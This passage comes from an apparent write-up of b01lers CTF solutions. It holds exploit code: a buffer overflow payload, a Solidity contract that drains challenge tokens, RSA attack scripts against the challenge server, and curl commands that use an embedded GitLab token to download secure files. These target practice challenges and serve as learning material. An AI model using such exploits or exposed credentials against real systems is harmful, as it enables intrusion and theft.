<span class="line"><span style="color:var(--astro-code-color-text)">p </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-keyword)"> b</span><span style="color:var(--astro-code-token-string-expression)">"A"</span><span style="color:var(--astro-code-token-keyword)"> *</span><span style="color:var(--astro-code-token-constant)"> 158</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">p </span><span style="color:var(--astro-code-token-keyword)">+=</span><span style="color:var(--astro-code-token-function)"> p64</span><span style="color:var(--astro-code-token-punctuation)">(win)</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">_r</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">recvline</span><span style="color:var(--astro-code-token-punctuation)">()</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">_r</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">sendline</span><span style="color:var(--astro-code-token-punctuation)">(p)</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">_r</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">interactive</span><span style="color:var(--astro-code-token-punctuation)">()</span></span>
<span class="line"><span style="color:var(--astro-code-token-comment)"># bctf{h0w_@bo0ut_a_n1ce_g@m3_0f_ch3ss?_ccb7a268f1324c84}</span></span>
<span class="line"></span></code></pre>
<h2 id="revjs-safe">rev/js-safe</h2>
<p>The code is obfuscated, so we use <code>https://deobfuscate.io/</code> to deobfuscate the code and ChatGPT to make the variable names make sense. Then solve the password to be <code>"p4wR0d"</code>.</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-color-background);color:var(--astro-code-color-text); overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:var(--astro-code-token-keyword)">></span><span style="color:var(--astro-code-token-function)"> require</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-string-expression)">"crypto-js"</span><span style="color:var(--astro-code-color-text)">).</span><span style="color:var(--astro-code-token-constant)">AES</span><span style="color:var(--astro-code-token-function)">.decrypt</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-string-expression)">"U2FsdGVkX19WKWdho02xWkalqVZ3YrA7QrNN4JPOIb5OEO0CW3Qj8trHrcQNOwsw"</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> "p4wR0d"</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-function)">.toString</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-function)">require</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-string-expression)">"crypto-js"</span><span style="color:var(--astro-code-color-text)">).</span><span style="color:var(--astro-code-token-constant)">enc</span><span style="color:var(--astro-code-color-text)">.Utf8);</span></span>
<span class="line"><span style="color:var(--astro-code-token-string-expression)">'bctf{345y-p4s5w0rd->w&#x3C;}'</span></span>
<span class="line"></span></code></pre>
<h2 id="miscb01lersparlay">misc/B01lersParlay</h2>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-color-background);color:var(--astro-code-color-text); overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:var(--astro-code-token-function)">$</span><span style="color:var(--astro-code-token-string)"> git</span><span style="color:var(--astro-code-token-string)"> clone</span><span style="color:var(--astro-code-token-string)"> https://shazly:glpat-R-Td9nSxVAHW-72qxt5M@gitlab.com/b01lersparlay/GenerationalWealth</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">$</span><span style="color:var(--astro-code-token-string)"> curl</span><span style="color:var(--astro-code-token-string)"> https://shazly:glpat-R-Td9nSxVAHW-72qxt5M@gitlab.com/api/v4/projects/56114917/secure_files?per_page=</span><span style="color:var(--astro-code-token-constant)">100</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">$</span><span style="color:var(--astro-code-token-string)"> curl</span><span style="color:var(--astro-code-token-string)"> https://shazly:glpat-R-Td9nSxVAHW-72qxt5M@gitlab.com/api/v4/projects/56114917/secure_files/1070175/download</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">bctf</span><span style="color:var(--astro-code-color-text)">{ruby_regex_is_goated_gitlab_api_is_cursed_6688}</span></span>
<span class="line"></span></code></pre>
<h2 id="miscbasketball-scholar">misc/basketball-scholar</h2>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-color-background);color:var(--astro-code-color-text); overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:var(--astro-code-token-keyword)">from</span><span style="color:var(--astro-code-color-text)"> PIL </span><span style="color:var(--astro-code-token-keyword)">import</span><span style="color:var(--astro-code-color-text)"> Image</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">import</span><span style="color:var(--astro-code-color-text)"> numpy </span><span style="color:var(--astro-code-token-keyword)">as</span><span style="color:var(--astro-code-color-text)"> np</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">older </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> Image</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">open</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-string-expression)">'orig.jpg'</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">newer </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> Image</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">open</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-string-expression)">'pete.png'</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">older </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">array</span><span style="color:var(--astro-code-token-punctuation)">(older)</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">newer </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">array</span><span style="color:var(--astro-code-token-punctuation)">(newer)</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">result </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">array</span><span style="color:var(--astro-code-token-punctuation)">([], dtype</span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-punctuation)">np.bool_)</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">for</span><span style="color:var(--astro-code-color-text)"> i </span><span style="color:var(--astro-code-token-keyword)">in</span><span style="color:var(--astro-code-token-function)"> range</span><span style="color:var(--astro-code-token-punctuation)">(older.shape[</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">]):</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">    for</span><span style="color:var(--astro-code-color-text)"> j </span><span style="color:var(--astro-code-token-keyword)">in</span><span style="color:var(--astro-code-token-function)"> range</span><span style="color:var(--astro-code-token-punctuation)">(older.shape[</span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">]):</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">        if</span><span style="color:var(--astro-code-color-text)"> (older</span><span style="color:var(--astro-code-token-punctuation)">[</span><span style="color:var(--astro-code-color-text)">i</span><span style="color:var(--astro-code-token-punctuation)">]</span><span style="color:var(--astro-code-color-text)">[j][</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-color-text)">] </span><span style="color:var(--astro-code-token-keyword)">!=</span><span style="color:var(--astro-code-color-text)"> newer</span><span style="color:var(--astro-code-token-punctuation)">[</span><span style="color:var(--astro-code-color-text)">i</span><span style="color:var(--astro-code-token-punctuation)">]</span><span style="color:var(--astro-code-color-text)">[j][</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-color-text)">] </span><span style="color:var(--astro-code-token-keyword)">or</span><span style="color:var(--astro-code-color-text)"> older</span><span style="color:var(--astro-code-token-punctuation)">[</span><span style="color:var(--astro-code-color-text)">i</span><span style="color:var(--astro-code-token-punctuation)">]</span><span style="color:var(--astro-code-color-text)">[j][</span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-color-text)">] </span><span style="color:var(--astro-code-token-keyword)">!=</span><span style="color:var(--astro-code-color-text)"> newer</span><span style="color:var(--astro-code-token-punctuation)">[</span><span style="color:var(--astro-code-color-text)">i</span><span style="color:var(--astro-code-token-punctuation)">]</span><span style="color:var(--astro-code-color-text)">[j][</span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-color-text)">] </span><span style="color:var(--astro-code-token-keyword)">or</span><span style="color:var(--astro-code-color-text)"> older</span><span style="color:var(--astro-code-token-punctuation)">[</span><span style="color:var(--astro-code-color-text)">i</span><span style="color:var(--astro-code-token-punctuation)">]</span><span style="color:var(--astro-code-color-text)">[j][</span><span style="color:var(--astro-code-token-constant)">2</span><span style="color:var(--astro-code-color-text)">] </span><span style="color:var(--astro-code-token-keyword)">!=</span><span style="color:var(--astro-code-color-text)"> newer</span><span style="color:var(--astro-code-token-punctuation)">[</span><span style="color:var(--astro-code-color-text)">i</span><span style="color:var(--astro-code-token-punctuation)">]</span><span style="color:var(--astro-code-color-text)">[j][</span><span style="color:var(--astro-code-token-constant)">2</span><span style="color:var(--astro-code-color-text)">])</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-token-comment)">            # print(i, j, older[i][j], newer[i][j], newer[i][j]/older[i][j]==2)</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">            result </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">append</span><span style="color:var(--astro-code-token-punctuation)">(result, (newer[i][j]</span><span style="color:var(--astro-code-token-keyword)">/</span><span style="color:var(--astro-code-token-punctuation)">older[i][j]</span><span style="color:var(--astro-code-token-keyword)">==</span><span style="color:var(--astro-code-token-constant)">2</span><span style="color:var(--astro-code-token-punctuation)">))</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">bits </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-string-expression)"> ''</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">join</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-constant)">list</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-function)">map</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">lambda</span><span style="color:var(--astro-code-token-parameter)"> x</span><span style="color:var(--astro-code-token-punctuation)">: </span><span style="color:var(--astro-code-token-string-expression)">'0'</span><span style="color:var(--astro-code-token-keyword)"> if</span><span style="color:var(--astro-code-token-punctuation)"> x </span><span style="color:var(--astro-code-token-keyword)">else</span><span style="color:var(--astro-code-token-string-expression)"> '1'</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">list</span><span style="color:var(--astro-code-token-punctuation)">(result))))</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">def</span><span style="color:var(--astro-code-token-function)"> bits2a</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-parameter)">b</span><span style="color:var(--astro-code-color-text)">):</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">    return</span><span style="color:var(--astro-code-token-string-expression)"> ''</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">join</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-function)">chr</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-constant)">int</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-string-expression)">''</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">join</span><span style="color:var(--astro-code-token-punctuation)">(x), </span><span style="color:var(--astro-code-token-constant)">2</span><span style="color:var(--astro-code-token-punctuation)">)) </span><span style="color:var(--astro-code-token-keyword)">for</span><span style="color:var(--astro-code-token-punctuation)"> x </span><span style="color:var(--astro-code-token-keyword)">in</span><span style="color:var(--astro-code-token-function)"> zip</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">*</span><span style="color:var(--astro-code-token-punctuation)">[</span><span style="color:var(--astro-code-token-function)">iter</span><span style="color:var(--astro-code-token-punctuation)">(b)]</span><span style="color:var(--astro-code-token-keyword)">*</span><span style="color:var(--astro-code-token-constant)">8</span><span style="color:var(--astro-code-token-punctuation)">))</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">import</span><span style="color:var(--astro-code-color-text)"> base64</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">print</span><span style="color:var(--astro-code-token-punctuation)">(base64.</span><span style="color:var(--astro-code-token-function)">b64decode</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-function)">eval</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-function)">bits2a</span><span style="color:var(--astro-code-token-punctuation)">(bits)).</span><span style="color:var(--astro-code-token-function)">decode</span><span style="color:var(--astro-code-token-punctuation)">()))</span></span>
<span class="line"><span style="color:var(--astro-code-token-comment)"># bctf{Go_b01lerCTFmakers!}</span></span>
<span class="line"></span></code></pre>
<h2 id="blockchainburgercoin">blockchain/burgercoin</h2>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-color-background);color:var(--astro-code-color-text); overflow-x: auto;" tabindex="0"><code><span class="line"><span>contract stealer {</span></span>
<span class="line"><span>    function getToken(address addr) public {</span></span>
<span class="line"><span>        burgercoin b = burgercoin(addr);</span></span>
<span class="line"><span>        b.purchaseBurger();</span></span>
<span class="line"><span>    }</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    function transferToMyWallet(address addr, address wallet) public {</span></span>
<span class="line"><span>        burgercoin b = burgercoin(addr);</span></span>
<span class="line"><span>        b.transfer(wallet, 1);</span></span>
<span class="line"><span>    }</span></span>
<span class="line"><span>}</span></span>
<span class="line"><span></span></span></code></pre>
<p>Then we just deploy the <code>stealer</code> contract, call <code>getToken</code> and <code>transferToMyWallet</code> repeatedly until we have 30 burgercoins. We then call <code>transferBurgerjointOwnership</code> using our own wallet and <code>transfer</code> all our coins to another wallet, e.g. the <code>stealer</code> contract. The flag is <code>bctf{you_made_b01lerburgers_go_bankrupt_rip}</code>.</p>
<h2 id="cryptohalf-big-rsa">crypto/half-big-rsa</h2>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-color-background);color:var(--astro-code-color-text); overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:var(--astro-code-token-keyword)">from</span><span style="color:var(--astro-code-color-text)"> Crypto</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-color-text)">Util</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-color-text)">number </span><span style="color:var(--astro-code-token-keyword)">import</span><span style="color:var(--astro-code-color-text)"> long_to_bytes</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">from</span><span style="color:var(--astro-code-color-text)"> math </span><span style="color:var(--astro-code-token-keyword)">import</span><span style="color:var(--astro-code-color-text)"> gcd</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">e </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)"> 8190</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">n </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)"> 665515140120452927777672138241759151799589898667434054796291409500701895847040006534274017960741836352283431369658890777476904763064058571375981053480910502427450807868148119447222740298374306206049235106218160749784482387828757815767617741823504974133549502118215185814010416478030136723860862951197024098473528800567738616891653602341160421661595097849964546693006026643728700179973443277934626276981932233698776098859924467510432829393769296526806379126056800758440081227444482951121929701346253100245589361047368821670154633942361108165230244033981429882740588739029933170447051711603248745453079617578876855903762290177883331643511001037754039634053638415842161488684352411211039226087704872112150157895613933727056811203840732191351328849682321511563621522716119495446110146905479764695844458698466998084615534512596477826922686638159998900511018901148179784868970554998882571043992165232556707995154316126421679595109794273650628957795546293370644405017478289280584942868678139801608538607476925924119532501884957937405840470383051787503858934204828174270819328204062103187487600845013162433295862838022726861622054871029319807982173856563380230936757321006235403066943155942418392650327854150659087958008526462507871976852849</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">c </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)"> 264114212766855887600460174907562771340758069941557124363722491581842654823497784410492438939051339540245832405381141754278713030596144467650101730615738854984455449696059994199389876326336906564161058000092717176985620153104965134542134700679600848779222952402880980397293436788260885290623102864133359002377891663502745146147113128504592411055578896628007927185576133566973715082995833415452650323729270592804454136123997392505676446147317372361704725254801818246172431181257019336832814728581055512990705620667354025484563398894047211101124793076391121413112862668719178137133980477637559211419385463448196568615753499719509551081050176747554502163847399479890373976736263256211300138385881514853428005401803323639515624537818822552343927090465091651711036898847540315628282568055822817711675290278630405760056752122426935056309906683423667413310858931246301024309863011027878238814311176040130230980947128260455261157617039938807829728147629666415078365277247086868327600962627944218138488810350881273304037069779619294887634591633069936882854003264469618591009727405143494184122164870065700859379313470866957332849299246770925463579384528152251689152374836955250625216486799615834558624798907067202005564121699019508857929778460</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">K </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-function)"> GF</span><span style="color:var(--astro-code-token-punctuation)">(n)</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">m </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-function)"> K</span><span style="color:var(--astro-code-token-punctuation)">(c).</span><span style="color:var(--astro-code-token-function)">nth_root</span><span style="color:var(--astro-code-token-punctuation)">(e)</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">print</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-function)">long_to_bytes</span><span style="color:var(--astro-code-token-punctuation)">(m))</span></span>
<span class="line"><span style="color:var(--astro-code-token-comment)"># bctf{Pr1M3_NUM83r5_4r3_C001_bu7_7H3Y_4r3_57r0N6_0N1Y_WH3N_7H3Y_4r3_MU171P113D_3V3N_1F_7H3Y_4r3_b1g}</span></span>
<span class="line"></span></code></pre>
<h2 id="cryptochoose_the_param">crypto/choose_the_param</h2>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-color-background);color:var(--astro-code-color-text); overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:var(--astro-code-token-keyword)">from</span><span style="color:var(--astro-code-color-text)"> pwn </span><span style="color:var(--astro-code-token-keyword)">import</span><span style="color:var(--astro-code-token-keyword)"> *</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">from</span><span style="color:var(--astro-code-color-text)"> Crypto</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-color-text)">Util</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-color-text)">number </span><span style="color:var(--astro-code-token-keyword)">import</span><span style="color:var(--astro-code-color-text)"> long_to_bytes</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-comment)"># r = process(["python3", "chal.py"])</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">r </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-function)"> remote</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-string-expression)">"gold.b01le.rs"</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">5001</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">M</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-color-text)"> N </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)"> None</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> None</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">while</span><span style="color:var(--astro-code-token-constant)"> True</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    r</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">recvuntil</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">b</span><span style="color:var(--astro-code-token-string-expression)">"Enter the bit length of your primes> "</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    r</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">sendline</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">b</span><span style="color:var(--astro-code-token-string-expression)">"60"</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    n </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)"> int</span><span style="color:var(--astro-code-token-punctuation)">(r.</span><span style="color:var(--astro-code-token-function)">recvline</span><span style="color:var(--astro-code-token-punctuation)">().</span><span style="color:var(--astro-code-token-function)">decode</span><span style="color:var(--astro-code-token-punctuation)">().</span><span style="color:var(--astro-code-token-function)">strip</span><span style="color:var(--astro-code-token-punctuation)">().</span><span style="color:var(--astro-code-token-function)">split</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-string-expression)">" = "</span><span style="color:var(--astro-code-token-punctuation)">)[</span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">], </span><span style="color:var(--astro-code-token-constant)">16</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    e </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)"> int</span><span style="color:var(--astro-code-token-punctuation)">(r.</span><span style="color:var(--astro-code-token-function)">recvline</span><span style="color:var(--astro-code-token-punctuation)">().</span><span style="color:var(--astro-code-token-function)">decode</span><span style="color:var(--astro-code-token-punctuation)">().</span><span style="color:var(--astro-code-token-function)">strip</span><span style="color:var(--astro-code-token-punctuation)">().</span><span style="color:var(--astro-code-token-function)">split</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-string-expression)">" = "</span><span style="color:var(--astro-code-token-punctuation)">)[</span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">], </span><span style="color:var(--astro-code-token-constant)">16</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    c </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)"> int</span><span style="color:var(--astro-code-token-punctuation)">(r.</span><span style="color:var(--astro-code-token-function)">recvline</span><span style="color:var(--astro-code-token-punctuation)">().</span><span style="color:var(--astro-code-token-function)">decode</span><span style="color:var(--astro-code-token-punctuation)">().</span><span style="color:var(--astro-code-token-function)">strip</span><span style="color:var(--astro-code-token-punctuation)">().</span><span style="color:var(--astro-code-token-function)">split</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-string-expression)">" = "</span><span style="color:var(--astro-code-token-punctuation)">)[</span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">], </span><span style="color:var(--astro-code-token-constant)">16</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    (p1</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-color-text)"> _)</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-color-text)"> (p2</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-color-text)"> _) </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-function)"> factor</span><span style="color:var(--astro-code-token-punctuation)">(n)</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    phi </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> (p1 </span><span style="color:var(--astro-code-token-keyword)">-</span><span style="color:var(--astro-code-token-constant)"> 1</span><span style="color:var(--astro-code-color-text)">) </span><span style="color:var(--astro-code-token-keyword)">*</span><span style="color:var(--astro-code-color-text)"> (p2 </span><span style="color:var(--astro-code-token-keyword)">-</span><span style="color:var(--astro-code-token-constant)"> 1</span><span style="color:var(--astro-code-color-text)">)</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    d </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-function)"> inverse_mod</span><span style="color:var(--astro-code-token-punctuation)">(e, phi)</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    m </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-function)"> pow</span><span style="color:var(--astro-code-token-punctuation)">(c, d, n)</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">    if</span><span style="color:var(--astro-code-color-text)"> M </span><span style="color:var(--astro-code-token-keyword)">is</span><span style="color:var(--astro-code-token-constant)"> None</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">        M</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-color-text)"> N </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> m</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-color-text)"> n</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">        continue</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    M_ </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-function)"> crt</span><span style="color:var(--astro-code-token-punctuation)">([M, m], [N, n])</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    N_ </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-function)"> lcm</span><span style="color:var(--astro-code-token-punctuation)">(N, n)</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">    if</span><span style="color:var(--astro-code-color-text)"> M </span><span style="color:var(--astro-code-token-keyword)">==</span><span style="color:var(--astro-code-color-text)"> M_</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">        break</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    M</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-color-text)"> N </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> M_</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-color-text)"> N_</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-function)">print</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-function)">long_to_bytes</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-constant)">int</span><span style="color:var(--astro-code-token-punctuation)">(M))[</span><span style="color:var(--astro-code-token-constant)">200</span><span style="color:var(--astro-code-token-punctuation)">:</span><span style="color:var(--astro-code-token-keyword)">-</span><span style="color:var(--astro-code-token-constant)">200</span><span style="color:var(--astro-code-token-punctuation)">].</span><span style="color:var(--astro-code-token-function)">decode</span><span style="color:var(--astro-code-token-punctuation)">())</span></span>
<span class="line"><span style="color:var(--astro-code-token-comment)"># bctf{dont_let_the_user_choose_the_prime_length_>w&#x3C;}</span></span>
<span class="line"></span></code></pre>
<h2 id="cryptocount_the_counter">crypto/count_the_counter</h2>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-color-background);color:var(--astro-code-color-text); overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:var(--astro-code-token-keyword)">from</span><span style="color:var(--astro-code-color-text)"> pwn </span><span style="color:var(--astro-code-token-keyword)">import</span><span style="color:var(--astro-code-token-keyword)"> *</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">from</span><span style="color:var(--astro-code-color-text)"> Crypto</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-color-text)">Util</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-color-text)">number </span><span style="color:var(--astro-code-token-keyword)">import</span><span style="color:var(--astro-code-color-text)"> long_to_bytes</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-color-text)"> bytes_to_long</span></span>
<span class="line"></span>
